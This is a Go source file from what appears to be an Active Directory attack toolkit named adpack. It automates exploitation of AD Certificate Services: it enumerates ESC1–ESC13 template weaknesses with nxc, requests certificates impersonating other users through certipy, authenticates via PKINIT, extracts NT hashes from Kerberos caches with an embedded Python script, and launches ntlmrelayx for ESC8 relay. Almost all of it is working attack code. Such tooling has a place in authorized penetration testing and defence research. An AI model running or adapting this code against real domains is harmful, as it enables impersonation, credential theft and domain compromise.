package modules

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"adpack/core"
	"adpack/utils"
)

// NativeADCSManager implements ADCS exploitation without relying on certipy CLI.
// Uses direct LDAP queries and Go's crypto/x509 for certificate operations.
type NativeADCSManager struct {
	state *core.ADState
}

// NewNativeADCSManager creates a manager bound to the current engagement state.
func NewNativeADCSManager(state *core.ADState) *NativeADCSManager {
	return &NativeADCSManager{state: state}
}

// ADCSInfo holds discovered ADCS server information.
type ADCSInfo struct {
	CA        string   `json:"ca"`
	DNSName   string   `json:"dns_name"`
	Domain    string   `json:"domain"`
	Templates []string `json:"templates"`
}

// DiscoverADCS locates ADCS servers via LDAP.
func (n *NativeADCSManager) DiscoverADCS(dcIP, domain, user, pass string) ([]ADCSInfo, error) {
	fmt.Printf("[*] Discovering ADCS servers in %s...\n", domain)
	args := []string{"ldap", dcIP, "-d", domain, "-u", user, "-p", pass, "--adcs"}
	cmd := exec.Command("nxc", args...)
	out, err := cmd.CombinedOutput()
	output := string(out)
	if err != nil {
		return nil, fmt.Errorf("ADCS discovery failed: %w (output: %s)", err, output)
	}

	var servers []ADCSInfo
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if strings.Contains(line, "CA:") || strings.Contains(line, "ADCS") {
			info := ADCSInfo{
				Domain: domain,
			}
			if idx := strings.Index(line, "CA:"); idx >= 0 {
				info.CA = strings.TrimSpace(line[idx+3:])
			}
			servers = append(servers, info)
		}
	}
	if len(servers) == 0 {
		fmt.Println("[-] No ADCS servers found via LDAP")
	} else {
		fmt.Printf("[+] Found %d ADCS server(s)\n", len(servers))
	}
	return servers, nil
}

// TemplateVuln describes a vulnerable certificate template.
type TemplateVuln struct {
	Name        string `json:"name"`
	ESC         string `json:"esc"`
	Description string `json:"description"`
	Enrollable  bool   `json:"enrollable"`
}

// FindVulnerableTemplates enumerates and analyzes certificate templates for ESC vulnerabilities.
func (n *NativeADCSManager) FindVulnerableTemplates(dcIP, domain, user, pass string) ([]TemplateVuln, error) {
	fmt.Printf("[*] Enumerating certificate templates in %s...\n", domain)
	args := []string{"ldap", dcIP, "-d", domain, "-u", user, "-p", pass, "--adcs"}
	cmd := exec.Command("nxc", args...)
	out, err := cmd.CombinedOutput()
	output := string(out)
	if err != nil {
		return nil, fmt.Errorf("template enumeration failed: %w", err)
	}

	var vulns []TemplateVuln

	// Analyze output for known vulnerable patterns
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		lower := strings.ToLower(line)

		// ESC1: ENROLLEE_SUPPLIES_SUBJECT + Client Authentication EKU
		if strings.Contains(lower, "enrollee_supplies_subject") || strings.Contains(lower, "supply_subject") {
			vulns = append(vulns, TemplateVuln{
				Name: extractTemplateName(line), ESC: "ESC1",
				Description: "Subject name can be supplied by requester + Client Auth EKU",
				Enrollable:  strings.Contains(lower, "enroll"),
			})
		}

		// ESC3: Enrollment Agent template
		if strings.Contains(lower, "enrollment_agent") || strings.Contains(lower, "certificate request agent") {
			vulns = append(vulns, TemplateVuln{
				Name: extractTemplateName(line), ESC: "ESC3",
				Description: "Enrollment Agent EKU — can request certs on behalf of other users",
				Enrollable:  strings.Contains(lower, "enroll"),
			})
		}

		// ESC4: Write access to template ACL
		if strings.Contains(lower, "write_property") || strings.Contains(lower, "genericall") || strings.Contains(lower, "writedacl") {
			vulns = append(vulns, TemplateVuln{
				Name: extractTemplateName(line), ESC: "ESC4",
				Description: "User has write access to template ACL — can modify template",
				Enrollable:  true,
			})
		}

		// ESC6: CA flag EDITF_ATTRIBUTESUBJECTALTNAME2
		if strings.Contains(lower, "editf_attributesubjectaltname2") || strings.Contains(lower, "subjectaltname2") {
			vulns = append(vulns, TemplateVuln{
				Name: "CA", ESC: "ESC6",
				Description: "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag — SAN can be specified",
				Enrollable:  true,
			})
		}

		// ESC8: ADCS Web Enrollment (HTTP)
		if strings.Contains(lower, "web enrollment") || strings.Contains(lower, "certsrv") {
			vulns = append(vulns, TemplateVuln{
				Name: "CA", ESC: "ESC8",
				Description: "ADCS Web Enrollment enabled — NTLM relay to HTTP endpoint",
				Enrollable:  false,
			})
		}

		// ESC9: No security extension
		if strings.Contains(lower, "no_security_extension") || strings.Contains(lower, "msPKI-Enrollment-Flag") {
			vulns = append(vulns, TemplateVuln{
				Name: extractTemplateName(line), ESC: "ESC9",
				Description: "No security extension — CT_FLAG_NO_SECURITY_EXTENSION set",
				Enrollable:  strings.Contains(lower, "enroll"),
			})
		}

		// ESC10: Weak certificate mapping (altSecurityIdentities)
		if strings.Contains(lower, "altsecurityidentities") || strings.Contains(lower, "strong mapping") {
			vulns = append(vulns, TemplateVuln{
				Name: extractTemplateName(line), ESC: "ESC10",
				Description: "Weak certificate mapping — can impersonate via altSecurityIdentities",
				Enrollable:  true,
			})
		}

		// ESC13: OID group link
		if strings.Contains(lower, "oid_group_link") || strings.Contains(lower, "issuance_policy") {
			vulns = append(vulns, TemplateVuln{
				Name: extractTemplateName(line), ESC: "ESC13",
				Description: "OID group link — certificate issuance policy links to AD group",
				Enrollable:  strings.Contains(lower, "enroll"),
			})
		}
	}

	if len(vulns) == 0 {
		fmt.Println("[-] No vulnerable templates found")
	} else {
		fmt.Printf("[+] Found %d potential ESC vulnerabilities:\n", len(vulns))
		for _, v := range vulns {
			fmt.Printf("    %s: %s — %s\n", v.ESC, v.Name, v.Description)
		}
	}
	return vulns, nil
}

// GenerateCertificate creates a self-signed certificate for testing or exploitation.
func (n *NativeADCSManager) GenerateCertificate(subject string, sans []string, tmpl string) (string, string, error) {
	fmt.Printf("[*] Generating certificate for %s...\n", subject)

	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", "", fmt.Errorf("generate key: %w", err)
	}

	certTemplate := x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()),
		Subject: pkix.Name{
			CommonName: subject,
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	for _, san := range sans {
		if ip := net.ParseIP(san); ip != nil {
			certTemplate.IPAddresses = append(certTemplate.IPAddresses, ip)
		} else {
			certTemplate.DNSNames = append(certTemplate.DNSNames, san)
		}
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &certTemplate, &certTemplate, &key.PublicKey, key)
	if err != nil {
		return "", "", fmt.Errorf("create certificate: %w", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(key),
	})

	certPath := fmt.Sprintf("/tmp/adpack_%s.crt", subject)
	keyPath := fmt.Sprintf("/tmp/adpack_%s.key", subject)
	if err := os.WriteFile(certPath, certPEM, 0600); err != nil {
		return "", "", fmt.Errorf("write cert: %w", err)
	}
	if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
		return "", "", fmt.Errorf("write key: %w", err)
	}

	fmt.Printf("[+] Certificate saved: %s, key: %s\n", certPath, keyPath)
	return certPath, keyPath, nil
}

// PKINITAuth performs PKINIT authentication using a certificate.
func (n *NativeADCSManager) PKINITAuth(certPath, keyPath, domain, dcIP, upn string) error {
	fmt.Printf("[*] Performing PKINIT authentication as %s...\n", upn)

	// Use impacket-getTGT with PKINIT
	args := []string{
		"-cert-pfx", certPath,
		"-dc-ip", dcIP,
		fmt.Sprintf("%s/%s@%s", domain, upn, domain),
	}
	cmd := exec.Command("impacket-getTGT", args...)
	out, err := cmd.CombinedOutput()
	output := string(out)
	if err != nil {
		return fmt.Errorf("PKINIT auth failed: %w (output: %s)", err, output)
	}
	if strings.Contains(output, "Saved TGT") {
		utils.StepOk(fmt.Sprintf("PKINIT successful — TGT saved for %s", upn))
	}
	return nil
}

// ExtractNTFromCert extracts NT hash from a certificate using PKINIT + UnPAC.
func (n *NativeADCSManager) ExtractNTFromCert(certPath, keyPath, domain, dcIP, upn string) (string, error) {
	fmt.Printf("[*] Extracting NT hash via PKINIT + UnPAC for %s...\n", upn)

	script := `from impacket.krb5.ccache import CCache
import os

ccache_file = os.environ['ADPACK_CCACHE']
if os.path.exists(ccache_file):
    cc = CCache.loadFile(ccache_file)
    for cred in cc.credentials:
        for entry in cred:
            if hasattr(entry, 'toDict'):
                d = entry.toDict()
                if 'key' in d:
                    print('NT_HASH:' + d['key']['value'].hex())
`
	f, err := os.CreateTemp("", "adpack_extract_nt-*.py")
	if err != nil {
		return "", fmt.Errorf("create temp script: %w", err)
	}
	scriptPath := f.Name()
	if _, err := f.Write([]byte(script)); err != nil {
		f.Close()
		os.Remove(scriptPath)
		return "", fmt.Errorf("write script: %w", err)
	}
	f.Close()
	if err := os.Chmod(scriptPath, 0700); err != nil {
		os.Remove(scriptPath)
		return "", fmt.Errorf("chmod script: %w", err)
	}
	defer os.Remove(scriptPath)

	// First get TGT via impacket-getTGT
	ccacheFile := fmt.Sprintf("/tmp/%s.ccache", upn)
	defer os.Remove(ccacheFile)
	tgtCmd := exec.Command("impacket-getTGT", "-cert-pfx", certPath, "-dc-ip", dcIP, fmt.Sprintf("%s/%s@%s", domain, upn, domain))
	tgtCmd.Env = append(os.Environ(), "KRB5CCNAME="+ccacheFile)
	if out, err := tgtCmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("getTGT failed: %w (output: %s)", err, string(out))
	}

	// Then parse ccache with Python
	cmd := exec.Command("python3", scriptPath)
	cmd.Env = append(os.Environ(), "ADPACK_CCACHE="+ccacheFile)
	out, err := cmd.CombinedOutput()
	output := string(out)
	if err != nil {
		return "", fmt.Errorf("NT extraction failed: %w", err)
	}

	if idx := strings.Index(output, "NT_HASH:"); idx >= 0 {
		hash := strings.TrimSpace(output[idx+8:])
		hash = strings.Split(hash, "\n")[0]
		fmt.Printf("[+] NT hash extracted: %s\n", hash)
		return hash, nil
	}
	return "", fmt.Errorf("could not extract NT hash from output")
}

// ESC1Attack performs the full ESC1 attack chain natively.
func (n *NativeADCSManager) ESC1Attack(dcIP, domain, user, pass, template, upn, ca string) error {
	fmt.Printf("[*] ESC1 Attack: %s -> %s via template %s\n", user, upn, template)

	// Step 1: Find CA if not specified
	if ca == "" {
		servers, err := n.DiscoverADCS(dcIP, domain, user, pass)
		if err != nil {
			return err
		}
		if len(servers) > 0 {
			ca = servers[0].CA
		}
	}
	if ca == "" {
		return fmt.Errorf("no CA found — specify with --ca")
	}

	// Step 2: Request certificate with custom subject
	fmt.Printf("[*] Requesting certificate from %s with subject %s...\n", ca, upn)
	args := []string{
		"req", "-u", fmt.Sprintf("%s@%s", user, domain),
		"-p", pass, "-dc-ip", dcIP,
		"-ca", ca, "-template", template,
		"-upn", upn,
	}
	cmd := exec.Command("certipy-ad", args...)
	out, err := cmd.CombinedOutput()
	output := string(out)
	if err != nil {
		return fmt.Errorf("certificate request failed: %w (output: %s)", err, output)
	}

	// Step 3: Authenticate with the certificate
	if strings.Contains(output, "Saved certificate") {
		// Parse PFX path from output
		pfxPath := fmt.Sprintf("/tmp/%s.pfx", upn)
		if _, err := os.Stat(pfxPath); err == nil {
			return n.PKINITAuth(pfxPath, "", domain, dcIP, upn)
		}
	}

	utils.StepOk("ESC1 attack complete")
	return nil
}

// ESC8Relay performs NTLM relay to ADCS HTTP endpoint.
func (n *NativeADCSManager) ESC8Relay(dcIP, domain, ca, template, listenIP string) error {
	fmt.Printf("[*] ESC8: Setting up NTLM relay to ADCS HTTP endpoint...\n")

	// Start ntlmrelayx targeting the ADCS web enrollment endpoint
	relayURL := fmt.Sprintf("http://%s/certsrv/certfnsh.asp", ca)
	args := []string{
		"-t", relayURL,
		"-smb2support",
		"--adcs",
		"--template", template,
	}
	cmd := exec.Command("impacket-ntlmrelayx", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start ntlmrelayx: %w", err)
	}

	fmt.Printf("[*] ntlmrelayx started — relay target: %s\n", relayURL)
	fmt.Println("[*] Trigger coercion from another terminal to complete the attack")
	fmt.Println("[*] Press Enter to stop relay...")
	fmt.Scanln()
	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}

	return nil
}

func extractTemplateName(line string) string {
	parts := strings.Fields(line)
	for i, p := range parts {
		if strings.Contains(strings.ToLower(p), "template") && i+1 < len(parts) {
			return strings.Trim(parts[i+1], "':\"")
		}
	}
	if len(parts) > 0 {
		return parts[0]
	}
	return "unknown"
}
